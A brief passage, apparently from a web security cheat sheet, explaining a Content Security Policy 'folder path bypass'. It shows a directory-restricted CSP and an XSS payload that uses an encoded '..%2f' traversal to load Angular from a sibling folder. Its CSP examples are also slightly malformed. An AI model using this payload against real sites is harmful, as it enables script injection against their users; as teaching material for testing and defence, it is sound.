Also known as Folder Path Bypass. If the CSP policy points to a directory that is safe to load scripts from. For example:
```html
<meta http-equiv="Content-Security-Policy" content="script src 'http://target-website.com/scripts/react/'">
```
```http
HTTP/1.1 200 OK
...
Content-Security-Policy: script-src 'http://target-website.com/scripts/react/';
```

An attacker can use the following payload to bypass CSP:
```txt
<script src="https://target-website.com/scripts/react/..%2fangular%2fangular.js"></script>
```

In which the browser would ultimately load `https://target-website.com/scripts/angular/angular.js`, ultimately allowing to use Angular directives to perform XSS.